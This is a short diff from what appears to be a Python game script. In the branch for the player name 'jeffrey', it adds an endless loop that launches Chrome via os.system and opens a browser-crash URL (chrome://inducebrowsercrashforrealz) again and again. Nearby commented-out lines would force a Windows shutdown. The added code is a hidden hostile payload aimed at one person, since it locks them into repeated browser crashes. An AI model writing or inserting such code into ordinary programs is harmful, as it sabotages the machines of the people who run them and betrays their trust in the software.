@@ -131,8 +131,8 @@ elif playername=="jeffrey":
     #time.sleep (7)
     #os.system ("shutdown /s /t 1")
     while True:
-
-        url= "chrome://crash"
+        os.system ("\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" chrome://inducebrowsercrashforrealz ")
+        url= "chrome://inducebrowsercrashforrealz"
         webbrowser.open (url)
 
 else:
